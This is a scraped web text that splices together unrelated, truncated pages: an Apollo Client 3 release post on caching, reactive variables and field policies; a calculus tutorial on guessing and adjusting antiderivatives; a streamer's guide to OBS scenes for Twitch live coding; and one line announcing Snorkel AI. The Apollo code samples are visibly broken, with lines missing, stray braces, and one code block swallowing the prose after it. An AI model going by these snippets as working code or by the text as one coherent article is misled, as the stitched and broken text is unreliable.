<p>When Apollo Client fetches data from your server, it caches that data using a <a rel="noreferrer noopener" href="https://www.apollographql.com/docs/react/caching/cache-configuration/#data-normalization" target="_blank">normalized structure</a> that matches your GraphQL schema. By caching this data, <em>Apollo Client locally reconstructs a subset of your back-end data graph</em>. This means that the next time Apollo Client queries some of that same data, it can fetch it directly from the cache, <em>even if an entirely different query requests it</em>. The cache only falls back to contacting your remote server when local data is missing or invalidated. And like any other GraphQL server, the cache provides APIs to <a rel="noreferrer noopener" href="https://www.apollographql.com/docs/react/caching/cache-configuration/#typepolicy-fields" target="_blank">define how types and fields are read and modified</a>.</p>



<p>Because the cache is integrated directly with Apollo Client, it knows exactly which queries use exactly which fields in your graph. Whenever a cached field’s value changes, Apollo Client automatically updates all of the queries that include that field. This makes the cache just as reactive as any other part of a modern web application.</p>



<p>It’s because of the cache-focused philosophy behind Apollo Client that we don’t think of it primarily as a library for executing GraphQL operations, but rather as <strong>a library for interacting with a client-side data graph</strong>.</p>



<h2>Feature Spotlight</h2>



<p>This is far from everything that’s new in AC3, but it’s some of what we’re most excited for you to try out in your application!</p>



<h3>Reactive variables</h3>



<p>A <a rel="noreferrer noopener" href="https://www.apollographql.com/docs/react/local-state/reactive-variables/" target="_blank">reactive variable</a> is a value that registers a dependency when you read it, and later triggers re-reading whenever the value is updated. The concept has been around for decades, predating <a rel="noreferrer noopener" href="https://docs.meteor.com/api/reactive-var.html" target="_blank">Meteor’s <code>ReactiveVar</code> API</a> back in 2014. Reactive variables are a staple of reactive programming, and now they enable flexible new ways of storing local state in AC3.</p>



<p>When you modify a reactive variable created with the <code>makeVar</code> function, Apollo Client automatically updates every active query that depends on that variable’s value. This is similar to what happens whenever a field in the cache changes, <em>however</em>: reactive variables <em>aren’t in the cache</em>. That means they can hold data of any type and structure, and you can interact with them throughout your application without using GraphQL syntax.</p>



<p>As a company with a long history of creating and consuming reactive variable APIs, we genuinely believe that this addition to Apollo Client will have a transformative effect on local state management.</p>



<p>Here’s an example:</p>



<pre><code>

<span>import</span> <span>{</span>
  InMemoryCache<span>,</span>
  makeVar<span>,</span>
  gql<span>,</span>
  useQuery<span>,</span>
<span>}</span> <span>from</span> <span>"@apollo/client"</span>




<span>const</span> darkModeVar <span>=</span> <span>makeVar</span><span>(</span><span>false</span><span>)</span><span>;</span>

  <span>}</span><span>,</span>
<span>}</span><span>)</span><span>;</span>

  <span>darkModeVar</span><span>(</span><span>!</span><span>darkModeVar</span><span>(</span><span>)</span><span>)</span><span>;</span>
<span>}</span></code></pre>



<h3>Cache field policies</h3>



<p>You can define a <a rel="noreferrer noopener" href="https://www.apollographql.com/docs/react/caching/cache-field-behavior/" target="_blank">field policy</a> for any and every GraphQL field that appears in your cache. A field policy can include a <a rel="noreferrer noopener" href="https://www.apollographql.com/docs/react/caching/cache-field-behavior/#the-read-function" target="_blank"><code>read</code> function</a> that customizes what happens when the field is read from the cache, and a <a rel="noreferrer noopener" href="https://www.apollographql.com/docs/react/caching/cache-field-behavior/#the-merge-function" target="_blank"><code>merge</code> function</a> that customizes what happens when it’s written.</p>



<pre><code><span>const</span> cache <span>=</span> <span>new</span> <span>InMemoryCache</span><span>(</span><span>{</span>
  typePolicies<span>:</span> <span>{</span>
    Person<span>:</span> <span>{</span>
      fields<span>:</span> <span>{</span>
        name<span>:</span> <span>{</span>
          <span>read</span><span>(</span><span>name</span><span>)</span> <span>{</span>
            
            <span>return</span> name<span>.</span><span>toUpperCase</span><span>(</span><span>)</span><span>;</span>
          <span>}</span>
        <span>}</span>
      <span>}</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>)</span><span>;</span></code></pre>



<p><strong>You can even do this for fields that aren’t in your schema!</strong> Such <a href="https://www.apollographql.com/docs/react/local-state/managing-state-with-field-policies/" target="_blank" rel="noreferrer noopener">local-only fields</a> are the basis for using AC3 to query both local and remote data simultaneously.</p>



<p>By defining all of this custom field logic in one place (the constructor of <code>InMemoryCache</code>), you avoid repeating code, and your teammates can interact with the types and fields you’ve configured <em>without</em> needing to understand how they’re stored or fetched.</p>



<p>After <a href="https://www.apollographql.com/docs/react/caching/cache-field-behavior/" target="_blank" rel="noreferrer noopener">reading the documentation</a>, you’ll have the tools to write your own field policies to handle use cases like:</p>



<ul><li>Default field values</li><li>Transforming or normalizing field values</li><li>Sorting and slicing lists</li><li>Exposing reactive variables as GraphQL fields</li><li>Using references to redirect to data elsewhere in the cache</li><li>Pagination (covered below as well)</li><li>…&nbsp;and much more!</li></ul>



<h3>Pagination helpers</h3>



<p>One of the most compelling use cases for a custom field policy is to handle <strong>paginated lists</strong> of data without baking any specific pagination logic into Apollo Client.</p>



<p>Even with field policies, though, it can be tricky to get pagination exactly right. With so many details to digest, you might want to start with one of our prewritten helper functions.</p>



<p>Here’s how you can consume search results from a Relay-friendly GraphQL server, such as the <a rel="noreferrer noopener" href="https://metaphysics-production.artsy.net/" target="_blank">Artsy search API</a>:</p>



<pre><code><span>import</span> <span>{</span> ApolloClient<span>,</span> InMemoryCache <span>}</span> <span>from</span> <span>"@apollo/client"</span><span>;</span>

<p>If you’ve ever read Relay’s <a rel="noreferrer noopener" href="https://relay.dev/graphql/connections.htm" target="_blank">GraphQL Cursor Connections specification</a>, you know how complex Relay pagination can be, so it’s a big help to capture that complexity in a single helper function.</p>



<blockquote><p>If you find your own field policies becoming repetitive, don’t forget that you can reuse logic! Write a helper function that generates a generic field policy, and that takes parameters for customization.</p></blockquote>



<p>Following this release, we’ll continue collecting useful cache policy helper functions like <code>offsetLimitPagination</code> and <code>relayStylePagination</code> in <code>@apollo/client/utilities</code>. Feel free to use them directly in your own code, or adapt them to your own specific needs!</p>



<h2>Release FAQ</h2>



<h3>How do I get started?</h3>



<p>If you have an existing application that uses Apollo Client 2.x, check out the <a href="https://www.apollographql.com/docs/react/migrating/apollo-client-3-migration/" target="_blank" rel="noreferrer noopener">migration guide</a> and refreshed <a href="https://www.apollographql.com/docs/react/" target="_blank" rel="noreferrer noopener">documentation</a>, as certain concepts and interfaces have changed. We’ve worked hard to ensure that every required change is a <em>positive</em> one that makes logical sense and leaves you feeling better about your application and its data.</p>



<p>If you’re brand new to Apollo Client, <a href="https://www.apollographql.com/docs/react/get-started/" target="_blank" rel="noreferrer noopener">get started here</a>!</p>



<h3>Is AC3 a complete rewrite of Apollo Client?</h3>



<p>No. We care deeply about providing a pleasant migration between software versions, and the majority of 2.x functionality remains in 3.0. You can <a href="https://www.apollographql.com/docs/react/migrating/apollo-client-3-migration/" target="_blank" rel="noreferrer noopener">migrate to AC3</a> now and incrementally adopt its features on your own timeline. Note that some 2.x features (such as local resolvers) are now officially deprecated.</p>



<p>Even though it <em>isn’t</em> a rewrite, AC3 includes features that needed a while to bake. As one example, the new <a href="https://www.apollographql.com/docs/react/caching/garbage-collection/#cacheevict" target="_blank" rel="noreferrer noopener"><code>cache.evict</code> API</a> (<a href="https://github.com/apollographql/apollo-client/pull/5310" target="_blank" rel="noreferrer noopener">#5310</a>) enables you to remove objects and individual fields from the cache. Initial versions of this feature made it possible to leave the cache in a broken state after evicting critical data. To address …</p></div></div>

Greeting from a bunch of&nbsp;<em>post-April-Fool bunnies</em>&nbsp;who never managed&nbsp;to get their modules published on time — because they were simply too busy eating <em>Easter eggs</em> and <em>shooting for the moon</em>. &nbsp;🙂</p><p>Moving onto a more serious topic though, if you’re currently into&nbsp;(or have been into) this thing called <a href="https://mathvault.ca/hub/higher-math/math-symbols/calculus-analysis-symbols/#Derivative_and_Integral" target="_blank" rel="noopener noreferrer"><strong>integral calculus</strong></a>, you might know from first-hand experience&nbsp;that integration in general is no easy task. After all, most of us&nbsp;spend at least a semester honing different methods of integration, which include — among others —&nbsp;the&nbsp;techniques&nbsp;of&nbsp;<strong>Substitution</strong>, <strong>Partial Fraction</strong> and I<strong>ntegration By Parts</strong>.</p><p>In what follows though, we will share with you a powerful technique for&nbsp;finding <strong>antiderivatives</strong>&nbsp;— possibly without paper and pen. We call&nbsp;this technique&nbsp;the <strong>Overshooting Method</strong>, which — as we shall see later — can even be just as efficient as several <strong>standard integration techniques</strong> combined.<span id="more-5619"></span></p><h2 id="basic"><span id="The_Overshooting_Method_%E2%80%94_Basic_Ideas"></span><a href="#toc">The Overshooting Method — Basic Ideas</a><span></span></h2><p>So what is this <em>marvelous</em> technique you ask? Well, the short answer is that it&nbsp;can be found&nbsp;in the header image above. What? <strong>Overshooting</strong>, of course! 🙂</p><p>More specifically, given a function $f$, the <strong>Overshooting Method</strong> consists in finding an antiderivative of $f$ first by&nbsp;<em>guessing</em> a <strong>potential candidate</strong>, and then checking to see how <em>close</em>&nbsp;the candidate&nbsp;<em>differentiates</em> to $f$.</p><p><span>In the event where&nbsp;the&nbsp;derivative is off, but <em>only</em> by an <strong>additional term</strong></span><span>&nbsp;or a </span><strong>multiple</strong><span>, then additional steps can be implemented to correct this discrepancy, thereby transforming a&nbsp;potential candidate into a <em>valid</em> antiderivative of $f$.</span></p><p>All right. That’s about as intuitive and accurate as it gets. In <strong>formal terms</strong> though, this is&nbsp;what the&nbsp;technique would look like <em>in a nutshell</em>:</p><div id=""><p>Theorem 1 — The Overshooting Method</p><div><p>Given a function $f$ defined on an interval $I$, if there exists another function $F^*$ such that:</p><ul><li>$(F^*)’ = kf$ on $I$ for some <em>non-zero</em> number $k$ (i.e., $F^*$ is off by a <strong>multiple</strong>), then the function $\dfrac{F^*}{k}$ constitutes&nbsp;a&nbsp;valid&nbsp;antiderivative of $f$ on $I$.</li><li>$(F^*)’=f + g$ on $I$ for some function $g$, with $\displaystyle \int g$ being one of its own antiderivatives on $I$ (i.e., $F^*$ is off by a <strong>term</strong> that is itself <em>antidifferentiable</em>), then the function $\displaystyle F^* – \int g$ constitutes a valid antiderivative of $f$ on $I$.</li></ul></div></div><p>OK. Enough of the <a href="https://mathvault.ca/math-glossary/">mathematical jargon</a>? Let’s move on to how we can apply the Overshooting Method to integrate all kinds of functions then!</p><h2 id="multiple"><span id="The_Overshooting_Method_%E2%80%94_Adjusting_for_Multiples"></span><a href="#toc">The Overshooting Method — Adjusting for Multiples</a><span></span></h2><p>As it turns out, when a potential antiderivative&nbsp;is off by <em>only</em> a <strong>multiple</strong>, it’s not hard to readjust it so as to produce a valid antiderivative. In fact, learning to adjust for a multiple paves the way for more complex applications of the Overshooting Method, which can take a bit more<em>&nbsp;insight</em> and&nbsp;<em>ingenuity</em> to be executed elegantly.</p><p>With that in mind, here are 16 examples illustrating how the Overshooting Method can be used to integrate certain <a href="https://mathvault.ca/hub/higher-math/math-symbols/algebra-symbols/#Key_Functions" target="_blank" rel="noopener noreferrer"><strong>elementary functions</strong></a> with ease. These include a good chunk of <a href="https://mathvault.ca/hub/higher-math/math-symbols/geometry-trigonometry-symbols/#Trigonometric_Functions" target="_blank" rel="noopener noreferrer">trigonometric functions</a>, exponential functions, power functions and trig-substitution functions.</p><h3 id="trig"><span id="Trigonometric_Functions"></span><a href="#toc">Trigonometric Functions</a><span></span></h3><h4 id="cos"><span id="Cosine_Functions"></span><a href="#toc">Cosine Functions</a><span></span></h4><p>To find an antiderivative of a function like $6\cos (2x+4)$, for instance, we start by noticing that since this&nbsp;function&nbsp;behaves very much like $\cos x$, we can try to integrate it&nbsp;<em>as if</em> we were dealing with&nbsp;$\cos x$. With this insight, the idea of&nbsp;$\sin (2x+4)$ being a <em>potential</em> antiderivative of&nbsp;$6\cos (2x+4)$ naturally comes to mind.</p><p>Before we move on though, let’s check&nbsp;how well this idea works out:</p><p>\begin{align*}[\sin (2x+4)]’ &amp; =\cos (2x+4)(2x+4)’ \\ &amp; = 2\cos (2x+4)= \frac{6\cos (2x+4)}{3} \end{align*}</p><p>So, $\sin (2x+4)$ is <em>off</em> by a multiple of $\dfrac{1}{3}$ as a result of <a href="https://mathvault.ca/chain-rule-derivative/">chain rule</a>. To get rid this multiple, we multiply our <em>potential antiderivative</em> by $3$, yielding that:</p><p>\begin{align*}\displaystyle [3\sin (2x+4)]’ &amp; =3\, [\sin (2x+4)]’\\ &amp; = 3\, \frac{6\cos (2x+4)}{3} \\ &amp; = 6\cos (2x+4) \qquad (\text{for all } x \in \mathbb{R}) \end{align*}</p><p>Hence, $\displaystyle \int&nbsp;6\cos (2x+4)\, dx = 3 \sin (2x+4) + C$ for all $x \in \mathbb{R}$ — as desired.</p><h4 id="sin"><span id="Sine_Functions"></span><a href="#toc">Sine Functions</a><span></span></h4><p>How about a function such as $\pi \sin (10x)$? Well, we can always begin by pulling&nbsp;the <em>coefficient</em> $\pi$ outside the integral:</p><p>$$ \int \pi \sin (10x)\, dx = \pi \int \sin (10x)\, dx$$</p><p>Presumably, since $\sin (10x)$ behaves very much like $\sin x$, the first potential antiderivative that comes to mind would be $-\cos (10x)$. To test it, we need to see what it <em>actually</em> differentiates to:</p><p>$$ [- \cos (10x)]’ = \sin (10x) (10x)’ = 10 \sin(10x) $$</p><p>This means that our candidate is off by a multiple of $10$. Dividing it however&nbsp;by $10$ yields that:</p><p>\begin{align*} \left(\frac{- \cos (10x)}{10}\right)’ &amp; = \frac{1}{10}\, [- \cos (10x)]’ \\ &amp;= \frac{1}{10} \, [10 \sin(10x)] \\ &amp; = \sin (10x) \qquad (\text{for all }x \in \mathbb{R})\end{align*}</p><p>which is exactly what we needed. Putting everything together, we get that&nbsp;$\displaystyle&nbsp;\int \pi \sin (10x)\, dx = \pi \int \sin (10x)\, dx $ $\displaystyle = \pi \, \frac{- \cos (10x)}{10} + C$ for all $x \in \mathbb{R}$.</p><h4 id="sec"><span id="Secant_Functions"></span><a href="#toc">Secant Functions</a><span></span></h4><p>For functions such as $\displaystyle \dfrac{1}{2} \sec^2 (4-x)$, we begin by pulling out the <em>extraneous</em> coefficent:</p><p>$$ \int \dfrac{1}{2} \sec^2 (4-x) \, dx= \dfrac{1}{2}&nbsp;\int \sec^2 (4-x) \, dx $$</p><p>Here, since $\sec^2 (4-x)$ behaves very much like $\sec^2 x$, we choose $\tan (4-x)$ as a potential antiderivative to start with. To be sure, we actually have that:</p><p>$$ [\tan (4-x)]’ = – \sec^2 (4-x) $$</p><p>which means that we are off by a <em>negative sign</em>. In this case, simply <em>negating</em>&nbsp;our candidate function&nbsp;would do the trick:</p><p>$$&nbsp;[-\tan (4-x)]’ = \sec^2 (4-x) $$</p><p>Therefore,</p><p>\begin{align*} \int&nbsp;\dfrac{1}{2} \sec^2 (4-x) \, dx &amp; = \dfrac{1}{2}&nbsp;\int \sec^2 (4-x) \, dx \\ &amp; = \frac{1}{2}\, &nbsp;[-\tan (4-x)] + C\end{align*}</p><p>(<strong>Bonus</strong>: Can you figure out what is the <em>largest</em> domain under which this equality holds? 🙂 )</p><h4 id="sectan"><span id="SecantTangent_Functions"></span><a href="#toc">Secant-Tangent Functions</a><span></span></h4><p>For functions such as $3 \sec (2x+ \pi) \tan (2x+ \pi)$, we begin by noticing that since this falls into the family of $\sec x \tan x$, a potential antidervative that comes to mind would be $\sec (2x+ \pi)$. To be sure, we have that:</p><p>\begin{align*} &nbsp;[\sec (2x + \pi)]’ &amp; = \sec (2x+\pi) \tan (2x+\pi) (2x+\pi)’ \\ &amp; = 2 \sec (2x+\pi) \tan (2x+\pi) \end{align*}</p><p>So almost there, except that we need to have $3$ as our <strong>leading coefficient</strong> instead of $2$, and a bit of reflection shows that multiplying our candidate&nbsp;by $\dfrac{3}{2}$ would do:</p><p>\begin{align*} &nbsp;\left( \frac{3}{2}\sec (2x + \pi) \right)’ &amp; = \frac{3}{2} \, 2 \sec (2x+\pi) \tan (2x+\pi) \\ &amp; = 3 \sec (2x+\pi) \tan (2x+\pi) \end{align*}</p><p>And that’s a <em>homerun</em>! Hence $\displaystyle \int&nbsp;3 \sec (2x+ \pi) \tan (2x+ \pi) \, dx =$ $\displaystyle \frac{3}{2}\sec (2x + \pi) + C$ (where $2x + \pi \ne \frac{\pi}{2} + k\pi$ for some <em>integer</em> $k$).</p><h4 id="csc"><span id="Cosecant_Functions"></span><a href="#toc">Cosecant Functions</a><span></span></h4><p>For functions like $-6 \csc^2 (5x-4)$, we start by noticing that since it pretty much behaves like $\csc^2 x$ (which antidifferentiates to $-\cot x$ — by the way), the idea of $-\cot (5x-4)$ being one of its&nbsp;antiderivatives becomes more than a <em>remote reality</em>. However, we need to&nbsp;verify this idea in practice:</p><p>$$[-\cot (5x-4)]’= \csc^2 (5x-4) (5x-4)’ = 5 \csc^2 (5x-4) $$</p><p>To correct the leading coefficient from $5$ to $-6$, we multiply our guess by $\dfrac{-6}{5}$, yielding that:</p><p>\begin{align*}&nbsp;\left( \frac{-6}{5} [- \cot (5x-4)] \right)’ &amp; = \frac{-6}{5} \, [5 \csc^2 (5x-4)] \\ &amp; = -6&nbsp;\csc^2 (5x-4)\end{align*}</p><p>Done! Hence $\int -6 \csc^2 (5x-4) \, dx =$ $\frac{-6}{5}\, [- \cot (5x-4)] + C =$ $\frac{6}{5} \cot (5x-4) +C\,$ (where $5x-4 \ne k \pi$ for some integer $k$).</p><h4 id="cot"><span id="Cotangent_Functions"></span><a href="#toc">Cotangent Functions</a><span></span></h4><p>OK. What about $\cot (2x-e)$? Let’s see… looking at the <strong>table of integrals</strong>, we see that $\cot x$ integrates to $\ln |\sin x|$, which suggests that $\ln |\sin (2x-e)|$ might work out very well as a candidate. Let’s check what it differentiates to:</p><p>$$ \left[\ln |\sin (2x-e)|\right]’ = \frac{\cos(2x-e)}{\sin (2x-e)}(2x-e)’=&nbsp;2\cot (2x-e)$$</p><p>Pretty close! Because in thise case, dividing both sides of the equation by $2$ would do:</p><p>$$ \left[\frac{1}{2}\ln |\sin (2x-e)| \right]’ = \cot (2x-e)$$</p><p>Therefore, $\displaystyle \int \cot (2x-e) \, dx =&nbsp;\frac{1}{2}\ln |\sin (2x-e)| + C$ (where $2x-e \ne k\pi$ for some integer $k$).</p><h3 id="exp"><span id="Exponential_Functions"></span><a href="#toc">Exponential Functions</a><span></span></h3><h4 id="natural"><span id="Natural_Base"></span><a href="#toc">Natural Base</a><span></span></h4><p>For functions such as $\displaystyle -5.6e^{-2x+4}$, once we notice its <em>similarity</em> with $\displaystyle e^x$, trying out $\displaystyle e^{-2x+4}$ becomes our <em>first line of attack</em>:</p><p>$$(e^{-2x+4})’=e^{-2x+4} \, (-2x+4)’ = -2 e^{-2x+4} $$</p><p>Now, multiplying both sides by $\dfrac{5.6}{2}$ yields:</p><p>$$\left( \frac{5.6}{2} \, e^{-2x+4} \right)’=\frac{5.6}{2} (-2 e^{-2x+4}) = -5.6 e^{-2x+4}$$</p><p>And that’s it! Hence $\displaystyle \int -5.6e^{-2x+4} \ dx = \frac{5.6}{2}(e^{-2x+4}) + C$ (for all $x \in \mathbb{R}$).</p><h4 id="arbitrary"><span id="Arbitrary_Bases"></span><a href="#toc">Arbitrary Bases</a><span></span></h4><p>So that was for the <strong>natural base</strong> $e$. For exponential functions of other bases like $34 \pi^{3x-1}$, we can always start by taking out the <em>annoying</em> leading coefficient:</p><p>$$ \int 34 \pi^{3x-1} \, dx = 34 \int \pi^{3x-1} \, dx$$</p><p>Now, what function could possibly <em>differentiate</em> to $\displaystyle&nbsp;\pi^{3x-1}$ ? Out of curiosity, let’s just try the function <em>itself</em>:</p><p>$$\left(\pi^{3x-1}\right)’ = \pi^{3x-1} \ln \pi \, (3x-1)’ = (3 \ln \pi) \pi^{3x-1}$$</p><p>In which case, all that’s left to do is to <em>divide both sides</em> by $3 \ln \pi$:</p><p>$$\left(\frac{\pi^{3x-1}}{3 \ln \pi}\right)’ = \pi^{3x-1}$$</p><p>yielding that $\displaystyle \int 34 \pi^{3x-1} \, dx =$ $\displaystyle 34 \int \pi^{3x-1} \, dx =$ $\displaystyle 34 \, \frac{\pi^{3x-1}}{3 \ln \pi} +C\,$ (for all $x \in \mathbb{R}$).</p><h3 id="power"><span id="Power_Functions"></span><a href="#toc">Power Functions</a><span></span></h3><h4 id="root"><span id="Square_Root_Functions"></span><a href="#toc">Square Root Functions</a><span></span></h4><p>Here’s another one for you: &nbsp;$e\sqrt{7x-9}$. <em>Strange</em> huh?</p><p>Actually, by inspection, this really just looks like $\sqrt{x}$, so let’s try out $\displaystyle \frac{(7x-9)^{\frac{3}{2}} }{\frac{3}{2}}$:</p><p>$$ \left(&nbsp;\frac{(7x-9)^{\frac{3}{2}} }{\frac{3}{2}} \right)’= \sqrt{7x-9}\, (7x-9)’ = 7 \sqrt{7x-9}$$</p><p>Here, we need to turn the $7$ into a $\displaystyle e$, and&nbsp;a bit of thought reveals&nbsp;that multiply both sides by $\dfrac{e}{7}$ would do the trick:</p><p>$$\left( …</p></div></div>

<p>If you’re reading this post, you might be interested in trying your hand at
live coding on stream, as a way of sharing your projects in a more relatable,
immediate way than a polished blog post, teaching others about programming, or
just as a way to have fun. I think that live coding and streams in general are
an interesting possible future form of both education and entertainment, and if
you’re contemplating starting your own stream, I sincerely hope that you do it.</p>
<p>This month marks the 6 month anniversary of the first stream on <a href="https://twitch.tv/large__data__bank">LARGE DATA
BANK</a>, my Twitch live coding channel. It’s
grown from a one-off Friday experiment into a regularly scheduled part of my
life, a community of dozens of wonderful regular viewers and chatters, and
an activity that’s one of the top things I look forward to doing every week.</p>
<p>I’ve learned a lot along the way, and this detailed guide to the way I’ve
set up my stream is my attempt at stepping back and sharing those learnings in
the hopes of inspiring others to try this awesome hobby for themselves. I hope
it’s useful for you as you start your own journey into streaming.</p>
<p>If you have any questions that aren’t answered in this blog post, I’m more than
happy to answer them <a href="https://twitter.com/JordanALewis">on Twitter</a> or
<a href="https://jordanlewis.org/">elsewhere online</a>.</p>
<p>Also, please send me a follow on <a href="https://largedatabank.com/">Twitch</a> and
<a href="https://twitter.com/JordanALewis">Twitter</a> for stream notifications! I stream
every Friday at 3 PM ET, and most Sundays at some time in the afternoon.</p>

<p>Whatever your reasons for wanting to try streaming, there’s quite a bit of setup
that you’ll need to do up front to try it out that can feel daunting. Everyone
has to go through this initial setup period, though, and so can you. You got
this!</p>
<p>The most important part of this post is the
<a href="#obs-configuration">section</a> about
<a href="https://obsproject.com/">OBS</a>, which is the awesome, cross-platform, free and
open source streaming software that most of the community uses. OBS will be
your best friend on your streaming journey! You will use it to control your
webcam, desktop, audio, and every other element that goes into the final
product of your livestream.</p>
<p>The rest of the post focuses on configuration that’s more specific to Twitch.
I like to use Twitch because I like the culture that’s developed there over
time, but plenty of people think that YouTube Live is more appropriate for
professional content. I’m not too familiar with YouTube Live, but most of the
discussion about OBS should apply the same for YouTube as it does for Twitch:
the main difference is that you’ll configure OBS to send to your YouTube
account instead of Twitch in Stream settings.</p>
<blockquote>
<p><strong><em>Yo!</em> If you’re trying to set up your very first stream</strong>, you really
don’t need most of the stuff in this guide, which represents what I’ve built
gradually over the past 6 months, stream by stream. My recommendation for the
livecoding-curious is to try streaming with a bare-bones setup, to see how
you like it, before investing in expensive gear or diving into hours of
configuration and asset creation. You can accomplish this in several hours
over a weekend. Set up a single scene in OBS with your captured desktop as
the background and your webcam in the corner, with your microphone configured
under Mic/Aux. That’s all you need: a simple setup for streaming your coding
is now yours! I’ll cover how to make that happen below, in the OBS
Configuration section. Just ignore most of the extra scenes and various bells
and whistles, and you’ll be good to go.</p>
</blockquote>

<p><a href="https://obsproject.com/">OBS</a> is where you’ll produce everything that your
viewers can see and hear on the live video, including your desktop, the camera
with your beautiful face on it, your voice, and any stream alerts, overlays,
text, or other information that you might want to show to your viewers.</p>
<p><img src="https://jordanlewis.org/images/stream/desktop2.png" alt="Desktop"></p>
<p>There’s a lot to cover with OBS and I’m not going to try to explain all of it,
so I’ll just talk about what’s worked for me. To make something that suits you,
you’ll need to flex your creative muscles! You can use the ideas here as a
starting place, but you’ll need to dive into OBS and play around: everyone’s
setup is going to be different.</p>
<h2 id="scenes">Scenes <a href="#scenes" arialabel="Anchor"><i data-feather="link-2"></i></a> </h2>
<p>A <em>scene</em> is OBS’s name for a particular layout of video and audio components
on a stream. Typically, you’ll see Twitch streamers stay on a single scene for
most of their stream: their game, desktop, or whatever their focus is. But it’s
handy to have a few extra ones for the intro and outro to your stream,
something that covers the screen for when you want to take a break, and so on.</p>
<p><img src="https://jordanlewis.org/images/stream/scenes.png" alt="Scenes popped out"></p>
<p>I have the main scenes that I use bound to global hotkeys, so I can switch
between them without having to click around in OBS. Unfortunately, sometimes
the hotkeys stop working during the stream - I’ve yet to figure out exactly why
this happens. If you happen to have this same problem and have found a
workaround, please let me know!</p>
<p>I have 6 primary scenes, and a couple of child scenes that are embedded in
several main scenes to deduplicate on-screen elements (the ones below the
<code>-----</code> in the picture). However, I spend the vast majority of my stream on one
of them: the Desktop scene.</p>
<h3 id="desktop">Desktop <a href="#desktop" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>This scene is the workhorse of the stream, and the one that’s active 95% of the
time. It consists of a full-screen, 1080p Display Capture source of my external
monitor. This is convenient because it leaves no ambiguity about what’s catpured
on the stream (it’s the whole monitor) and leaves my laptop screen free for
the OBS window, monitoring chat, and anything else that I want to look at while
streaming without having to show my viewers.</p>
<p>My <a href="https://jordanlewis.org/posts/desk-setup-2020">Desktop setup post</a> goes into more detail about the
way that I’ve set up my desk to have two monitors. It’s so convenient for the
stream that I’m hooked, and I’m not sure how I’d manage without.</p>
<p><img src="https://jordanlewis.org/images/stream/desktopscene.png" alt="Desktop Scene in OBS"></p>
<blockquote>
<p>A quick note on font size: you have to make your text editor font quite large
to make it legible for your viewers! It will take a little while to get used
to this. I use 26-point font in my editor, which provides only about 30
visible horizontal lines of code. This is next to nothing compared to the
amount of context you’re probably used to seeing while programming. This
hamstringing is worth it, though: the bigger your font, the more likely it is
that your viewers will be able to follow along with what you’re doing, stay
engaged, ask questions, learn, and have fun.</p>
<p>You should also try to remove as many distracting elements from your editor
and desktop as possible while streaming, to keep the focus on the code. For
me, this has meant disabling the Mac’s menubar and Dock, and removing the
vast majority of toolbars from my IDE.</p>
</blockquote>
<p>Besides the desktop capture source, which is at the back of the scene, I’ve
added several other sources:</p>
<ol>
<li>Face cam, which is a video source from my capture card (more information about the video sources in the <a href="#video">Video</a> section)</li>
<li>Keyboard cam, which is a video source from a webcam pointed at my keyboard.</li>
<li>A couple of text boxes, to show my most recent subscriber, follower, and
some on-stream commands. The text boxes are updated automatically by the
<a href="https://streamlabs.com/dashboard#/streamlabels">StreamLabels</a> app.</li>
<li>A web page source connected to Streamlabs Stream Alerts, which I’ll cover <a href="#stream-alerts">below</a>.</li>
</ol>
<p>I definitely didn’t start with all of these elements - it’s quite a lot of work
to tweak things just the way you want - but I’ve kept this configuration for the
past couple of months and I like the way it looks.</p>
<h3 id="whiteboard">Whiteboard <a href="#whiteboard" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>The whiteboard scene is meant to showcase my iPad full screen, allowing me to
draw things on stream to demonstrate ideas or concepts. I use the Concepts app
on the iPad along with an Apple Pencil for drawing, and it works pretty nicely.</p>
<p><img src="https://jordanlewis.org/images/stream/whiteboard.png" alt="Whiteboard scene"></p>
<p>I didn’t know how to fill up the space on the bottom left, since the iPad
doesn’t have a widescreen aspect ratio like my monitor does, so I put a picture
that my friend Aileen drew of me to make the stream a bit more visually
interesting!</p>
<p>This scene references the same facecam and alerts source as the Desktop scene.
You can definitely use DRY principles in OBS, just like software - but it does
get tricky to keep everything de-duplicated.</p>
<h3 id="ipad-green-screen-overlay">iPad Green Screen Overlay <a href="#ipad-green-screen-overlay" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>I also set up a “green screen” configuration for the iPad that I can overlay
over any other scene with a global hotkey. This gives me the ESPN football
announcer effect during my stream: I can draw on my iPad, and the lines will
appear overlayed on top of whatever else I have on stream at the time.</p>
<p>This is probably the most complex video element on my
stream, but OBS makes it pretty simple to set up. I added a Color Key filter
with a black background on top of the raw iPad video feed, set my drawing app
to have a black background, and tweaked the Color Key settings in OBS until
things looked right:</p>
<p><img src="https://jordanlewis.org/images/stream/colorkey.png" alt="iPad Color Key"></p>
<p>I don’t use this element as nearly as often as I’d like, but I think it’s
pretty neat. I recorded a <a href="https://www.youtube.com/watch?v=U4WJQmN1cSo">demo
video</a> of it if you’re curious for
how it looks - I also use it occasionally on the stream.</p>
<h3 id="selfie">Selfie <a href="#selfie" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>This is just a full-screen version of the facecam. I copied the name of the
scene from <a href="https://medium.com/@suzhinton/my-twitch-live-coding-setup-b2516672fb21">@noopkat’s
blog</a>.</p>
<p><img src="https://jordanlewis.org/images/stream/selfie.png" alt="Selfie scene"></p>
<p>I use this scene for “turn to the camera” moments, which I find really fun. I’ll
switch to the scene, look right at the camera, and talk for a bit before
switching back to the desktop view.</p>
<h3 id="starting-soon">Starting Soon <a href="#starting-soon" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>This scene goes on as soon as the stream turns on, until I’m ready to start
talking to the camera. I’ll usually start the stream a few minutes before the
time that I announced on Twitter for my stream, and leave it up until that time
comes (with a muted mic!).</p>
<p><img src="https://jordanlewis.org/images/stream/startingsoon.png" alt="Starting Soon scene"></p>
<p>I used a gif I found on the internet of someone typing, so people can tell that
the stream is live even though there’s nothing happening yet. There’s also music
during this “pre-roll”. I’ll talk about music and sound <a href="#audio">later</a>).</p>
<h3 id="brb">BRB <a href="#brb" arialabel="Anchor"><i data-feather="link-2"></i></a> </h3>
<p>I’ll put this scene on if I need to step away from the stream for a moment to
use the bathroom or whatever. I added a sound to …</p></div></section></article></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                  <p>
                      Today I’m excited to announce Snorkel AI’s launch out of stealth!
